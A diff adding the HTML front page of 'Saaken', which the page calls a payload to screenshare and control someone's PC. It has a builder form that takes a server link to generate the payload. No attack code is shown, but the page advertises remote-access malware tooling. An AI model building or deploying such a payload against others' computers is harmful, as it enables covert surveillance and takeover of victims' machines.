@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href='/static/main.css' />
+    <title>Saaken</title>
+</head>
+<body>
+    <div class="background"></div>
+
+    <div class="card">
+        <div class="card-title">
+            <h1>Saaken</h1>
+        </div>
+        <div class="card-description">
+            <p>Saaken is a payload to screenshare & control someone's pc</p>
+        </div>
+    </div>
+
+    <div class="builder">
+        <div class="builder-title">
+            <h1>Builder</h2>
+        </div>
+        <div class="builder-description">
+            <p>Build your own Saaken payload</p>
+        </div>
+        <form action="/run" class="builder-form">
+            <label for="serverlink">Server link: </label><br>
+            <input type="text" id="serverlink" name="serverlink" value=""><br>
+            <input type="submit" value="Submit" id="submitbutton">
+        </form>
+    </div>
+
+    <div class="logo-footer">
+        <a href="https://github.com/xpierroz/Saaken" target="_blank">
+            <img src="/static/github.png" alt="GitHub logo" className='github-logo'/>
+          </a>
+    </div>
+</html>
